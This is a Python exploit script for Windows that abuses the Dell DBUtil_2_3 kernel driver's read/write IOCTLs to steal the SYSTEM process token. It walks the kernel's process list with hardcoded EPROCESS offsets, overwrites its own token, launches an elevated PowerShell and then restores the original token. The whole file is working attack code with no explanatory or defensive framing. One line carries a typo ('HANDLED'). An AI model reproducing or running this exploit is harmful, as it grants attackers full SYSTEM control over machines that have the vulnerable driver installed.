from ctypes import (
    windll,
    LittleEndianStructure,
    POINTER,
    byref,
    cast,
    sizeof,
    c_uint64,
    c_ubyte,
    memmove,
)
from ctypes.wintypes import LPVOID, DWORD, LPCSTR, LPSTR, BOOL, HANDLE
from functools import partial
import os


gle = windll.kernel32.GetLastError



def errcheck_bool(res, func, args):
    if not res:
        raise Exception("{} failed. : {}".format(func.__name__, gle()))
    return res


def errcheck_drivername(res, func, args):
    if res == 0:
        raise Exception("{} failed. : {}".format(func.__name__, gle()))
    if res == args[2]:
        raise Exception(
            "{} failed. Buffer too short. : {}".format(func.__name__, gle())
        )
    return res


def errcheck_createfile(res, func, args):
    if res == HANDLE(-1).value: 
        raise Exception("Failed to open device {}. GLE: {}".format(args[0], gle()))
    return res



GetProcAddress = windll.kernel32.GetProcAddress
LoadLibraryA = windll.kernel32.LoadLibraryA
CreateFileA = windll.kernel32.CreateFileA
DeviceIoControl = windll.kernel32.DeviceIoControl
GetDeviceDriverBaseNameA = windll.Psapi.GetDeviceDriverBaseNameA
EnumDeviceDrivers = windll.Psapi.EnumDeviceDrivers


GetProcAddress.restype = LPVOID
GetProcAddress.argtypes = [LPVOID, LPCSTR]
LoadLibraryA.restype = LPVOID
LoadLibraryA.argtypes = [LPCSTR]
CreateFileA.restype = HANDLED
CreateFileA.argtypes = [LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE]
CreateFileA.errcheck = errcheck_createfile
DeviceIoControl.restype = BOOL

DeviceIoControl.argtypes = [
    HANDLE,
    DWORD,
    LPVOID,
    DWORD,
    LPVOID,
    DWORD,
    POINTER(DWORD),
    LPVOID,
]
DeviceIoControl.errcheck = errcheck_bool
GetDeviceDriverBaseNameA.restype = DWORD
GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPCSTR, DWORD]
GetDeviceDriverBaseNameA.errcheck = errcheck_drivername
EnumDeviceDrivers.restype = BOOL
EnumDeviceDrivers.argtypes = [LPVOID, DWORD, POINTER(DWORD)]
EnumDeviceDrivers.errcheck = errcheck_bool


GENERIC_READ = 1 << 30
GENERIC_WRITE = 1 << 31
FILE_SHARE_READ = 1
FILE_SHARE_WRITE = 2
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80
"""
dt _EPROCESS
nt!_EPROCESS
   +0xXXX UniqueProcessId    : Ptr64 Void
   +0xYYY ActiveProcessLinks : _LIST_ENTRY
   +0xZZZ Token              : _EX_FAST_REF
"""
pid_off = 0x440
aplinks_off = 0x448
token_off = 0x4B8
key = 0


def GetProcAddressAbsolute(hmodule, realbase, symbol):    
    return GetProcAddress(hmodule, symbol) - hmodule + realbase


class DbMemcpy(LittleEndianStructure):
    _fields_ = [("key", c_uint64), ("ptr", LPVOID), ("offset", DWORD), ("pad", DWORD)]


def _read(hdev, ptr, size):
    mc = DbMemcpy(key, cast(ptr, LPVOID), 0, 0)
    buflen = sizeof(mc) + size
    
    buf = (c_ubyte * buflen)()
    memmove(buf, bytes(mc), sizeof(mc))
    DeviceIoControl(
        hdev, 0x9B0C1EC4, byref(buf), buflen, byref(buf), buflen, None, None
    )
    return bytes(buf)[sizeof(mc) :]


def _write(hdev, ptr, contents):
    mc = DbMemcpy(key, cast(ptr, LPVOID), 0, 0)
    buf = bytes(mc) + contents
    DeviceIoControl(hdev, 0x9B0C1EC8, buf, len(buf), buf, len(buf), None, None)


def get_driver_bases():    
    lpcbNeeded = DWORD()
    EnumDeviceDrivers(None, 0, byref(lpcbNeeded))
    bases = (LPVOID * int(lpcbNeeded.value / sizeof(LPVOID)))()
    EnumDeviceDrivers(byref(bases), lpcbNeeded, byref(lpcbNeeded))
    drvbuf = LPSTR(b"\x00" * 260)  # max path should be enough
    ret = dict()
    for base in bases:
        if not base:
            continue
        GetDeviceDriverBaseNameA(base, drvbuf, 260)
        ret[drvbuf.value] = base
    return ret



drivers = get_driver_bases()
krnlname = b"ntoskrnl.exe"
krnlbase = drivers[krnlname]


hdb = CreateFileA(
    b"\\\\.\\DBUtil_2_3",
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    None,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    None,
)

read = partial(_read, hdb)
write = partial(_write, hdb)
read_ptr = lambda addr: int.from_bytes(read(addr, 8), "little")
write_ptr = lambda addr, val: write(addr, val.to_bytes(8, "little"))


hkernel = LoadLibraryA(krnlname)
lpisp = GetProcAddressAbsolute(hkernel, krnlbase, b"PsInitialSystemProcess")
isp = read_ptr(lpisp)
systoken = read_ptr(isp + token_off)
systoken &= ~0b1111
print("System token: " + hex(systoken))


mypid = os.getpid()
curpid = 0
curproc = isp
while curpid != mypid:
    curproc = read_ptr(curproc + aplinks_off)
    curproc -= aplinks_off
    curpid = read_ptr(curproc + pid_off)

print("Got curproc eprocess address = 0x{:08x}".format(curproc))

oldtoken = read_ptr(curproc + token_off)
write_ptr(curproc + token_off, systoken)


os.system("powershell.exe")
print("Done. Repairing.")
write_ptr(curproc + token_off, oldtoken)
